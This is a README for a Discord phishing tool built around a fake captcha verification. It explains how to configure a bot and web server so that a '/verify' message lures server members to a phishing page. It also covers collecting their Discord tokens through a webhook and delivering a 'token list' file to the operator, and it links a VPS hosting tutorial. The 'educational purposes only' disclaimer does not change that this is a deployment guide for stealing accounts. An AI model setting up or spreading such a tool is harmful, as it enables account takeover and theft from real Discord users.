
<p align="center">
  <img src="https://cdn.discordapp.com/emojis/1150748295405240350.webp?size=96&quality=lossless" width="100" height="auto">
  <br>
  <a href="https://t.me/lofygang">Telegram Group</a>
</p>

### Disclaimer

* ⚠ **This project is for educational and research purposes only.** I am not responsible for any misuse of this tool.

---

### Demonstration

Watch the video below for a full demo of the phishing page in action:

[Video Link](https://streamable.com/jc7bys)

---

### Installation

1. Run the following command to install all required dependencies:
   ```
   npm i
   ```

---

### Configuration

This code starts both the Discord bot and the server at the same time, designed for testing and research. You’ll need a registered Discord bot and a configured domain for it to work properly.

Before running, open the `config.json` file and update it with your details. Here’s an example:

```json
{
  "webhook": "Enter your webhook URL here to receive data",
  "domain": {
    "url": "Enter your domain (e.g., https://your-domain.com)"
  },
  "bot": {
    "token": "Your Discord bot token",
    "clientid": "Your bot’s client ID",
    "guildid": "The server ID where commands will be registered"
  },
  "owner": {
    "id": "Your Discord user ID (for command permissions)"
  },
  "profile": {
    "pfp": {
      "alter": "Set to true to auto-update the profile picture",
      "changed": false
    }
  }
}
```

---

### Enabling Bot Intents

The bot needs specific permissions (intents) to work. Follow these steps:

1. Go to the [Discord Developer Portal](https://discord.com/developers/applications).
2. Select your bot application.
3. Click **Bot** in the sidebar.
4. Under **Privileged Gateway Intents**, turn on:
   - **Presence Intent**
   - **Server Members Intent**
   - **Message Content Intent**
5. Save your changes.

---

### Usage

After setting up `config.json`, start the project with:

```
node main.mjs
```

In your Discord server, use this command:

```
/verify
```

- The bot will send an embed message in the channel.
- Click "verify," then "click here" to visit the test page.

To get the token list, use:

```
/help
```

- The bot will DM you a `token.txt` file with the token list.

---

### Hosting on a VPS

Want to host this project on a Linux VPS? Check out my detailed hosting tutorial here:  
[**Hosting Tutorial**](https://rentry.co/Discord-Captcha-Fishing)

---

### Conclusion

* This project is a learning tool for digital security, combining Discord bot functionality with web server simulation.
* Need help or have questions? Contact me on Telegram: [t.me/oppolar](https://t.me/oppolar).

---

### Notes
- Ensure your domain and VPS are set up before running Certbot (see the hosting tutorial for DNS setup).
- This README assumes you’re using `main.mjs` (updated from `main.js` to match the hosting tutorial).

---
